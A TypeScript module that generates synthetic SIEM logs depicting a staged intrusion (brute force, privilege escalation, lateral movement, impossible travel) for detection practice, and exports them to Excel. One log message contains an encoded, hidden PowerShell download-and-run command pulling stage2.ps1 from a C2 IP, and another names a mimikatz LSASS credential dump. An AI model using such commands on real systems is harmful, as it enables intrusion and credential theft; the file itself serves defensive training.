import * as XLSX from 'xlsx';
import { LogEntry } from '@/types';
import { generateId } from './utils';

export function generateSampleSIEMLogs(): LogEntry[] {
  const baseTime = new Date('2026-11-02T10:00:00Z').getTime();
  const logs: LogEntry[] = [];

  const addLog = (
    minutesOffset: number,
    source_ip: string,
    destination_ip: string,
    user: string,
    action: string,
    event_type: string,
    severity: string,
    message: string,
    extra: Partial<LogEntry> = {}
  ) => {
    const timestamp = new Date(baseTime + minutesOffset * 60 * 1000).toISOString();
    logs.push({
      id: generateId(),
      timestamp,
      source_ip,
      destination_ip,
      user,
      action,
      event_type,
      severity,
      message,
      protocol: extra.protocol || 'TCP',
      port: extra.port || 443,
      status: extra.status || 'Success',
      device: extra.device || 'FIREWALL-CORE-01',
      raw_log: `${timestamp} | SRC=${source_ip} | DST=${destination_ip} | USER=${user} | ACT=${action} | EVT=${event_type} | MSG=${message}`,
      ...extra,
    });
  };

  // 1. Normal baseline internal traffic (RFC 1918 Private Subnet)
  for (let i = 0; i < 35; i++) {
    addLog(
      i * 2,
      `10.0.0.${10 + (i % 8)}`,
      '10.0.0.2',
      `employee_${(i % 5) + 1}`,
      'Network Connect',
      'Traffic Allowed',
      'Low',
      'Normal internal web service browsing',
      { port: 80, status: 'Allowed' }
    );
  }

  // 2. Incident 1: Brute Force Attack by genuine external attacker IP targeting Administrator
  const attackerIp = '185.220.101.5';
  for (let i = 0; i < 12; i++) {
    addLog(
      15 + i * 0.25, // Within 3 minutes
      attackerIp,
      '10.0.0.5',
      'Administrator',
      'User Logon',
      'Logon Failure',
      'High',
      `Logon failure: bad password attempt count #${i + 1} from external host`,
      { status: 'Failed', port: 3389, protocol: 'RDP' }
    );
  }
  // Attacker succeeds!
  addLog(
    19,
    attackerIp,
    '10.0.0.5',
    'Administrator',
    'User Logon',
    'Logon Success',
    'Critical',
    'Successful logon established after multiple authentication failures',
    { status: 'Success', port: 3389, protocol: 'RDP' }
  );

  // 3. Incident 2: Anomalous Command Execution on the compromised internal host
  addLog(
    21,
    '10.0.0.5',
    '10.0.0.5',
    'Administrator',
    'Process Creation',
    'Command Execution',
    'High',
    'cmd.exe spawned powershell.exe with whoami /priv and systeminfo enumeration',
    { device: 'SRV-DC-01', status: 'Success' }
  );

  const c2ServerIp = '45.33.32.156';
  addLog(
    23,
    '10.0.0.5',
    c2ServerIp,
    'Administrator',
    'Process Creation',
    'Suspicious Command',
    'Critical',
    `powershell.exe -nop -w hidden -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA== downloadstring http://${c2ServerIp}/stage2.ps1`,
    { device: 'SRV-DC-01', port: 8080 }
  );

  addLog(
    25,
    '10.0.0.5',
    '10.0.0.5',
    'Administrator',
    'Process Creation',
    'Credential Access',
    'Critical',
    'Execution of mimikatz.exe sekurlsa::logonpasswords to dump LSASS memory tokens',
    { device: 'SRV-DC-01' }
  );

  // 4. Incident 3: Privilege Escalation
  addLog(
    27,
    '10.0.0.5',
    '10.0.0.5',
    'svc_backup',
    'Security Group Management',
    'Privilege Escalation',
    'Critical',
    'User svc_backup added to admin group "Domain Admins" with elevated token privileges',
    { device: 'SRV-DC-01', status: 'Success' }
  );

  addLog(
    29,
    '10.0.0.5',
    '10.0.0.5',
    'svc_backup',
    'Privilege Assignment',
    'Sensitive Privilege Use',
    'High',
    'Special privileges SeDebugPrivilege and SeImpersonatePrivilege assigned via runas elevated',
    { device: 'SRV-DC-01' }
  );

  // 5. Incident 4: Lateral Movement across corporate workstations
  const targetWorkstations = ['10.0.1.15', '10.0.1.22', '10.0.1.48', '10.0.2.100'];
  targetWorkstations.forEach((target, idx) => {
    addLog(
      32 + idx * 2,
      '10.0.0.5',
      target,
      'svc_backup',
      'Remote Network Logon',
      'Lateral Movement',
      'High',
      `Remote desktop and psexec execution over SMB port 445 with Pass The Hash NTLM relay`,
      { port: 445, protocol: 'SMB', device: `WKSTN-${100 + idx}` }
    );
  });

  // 6. Incident 5: Suspicious Login / Impossible Travel from distinct public geographic origins
  const travelIps = ['194.26.29.112', '185.180.143.11', '91.240.118.172'];
  travelIps.forEach((ip, idx) => {
    addLog(
      45 + idx * 3,
      ip,
      '10.0.0.8',
      'finance_director',
      'User Authentication',
      'Cloud Signin',
      'High',
      `User finance_director signed in successfully from anomalous geographic origin IP ${ip}`,
      { status: 'Success', device: 'AZURE-AD-PROXY' }
    );
  });

  return logs;
}

export function downloadSampleExcelFile() {
  const logs = generateSampleSIEMLogs();
  const rows = logs.map((l) => ({
    Timestamp: l.timestamp,
    Source_IP: l.source_ip,
    Destination_IP: l.destination_ip,
    User: l.user,
    Action: l.action,
    Event_Type: l.event_type,
    Severity: l.severity,
    Protocol: l.protocol,
    Port: l.port,
    Status: l.status,
    Device: l.device,
    Message: l.message,
    Raw_Log: l.raw_log,
  }));

  const worksheet = XLSX.utils.json_to_sheet(rows);
  const workbook = XLSX.utils.book_new();
  XLSX.utils.book_append_sheet(workbook, worksheet, 'Security_Logs');
  XLSX.writeFile(workbook, 'SIEM_Export_Sample.xlsx');
}
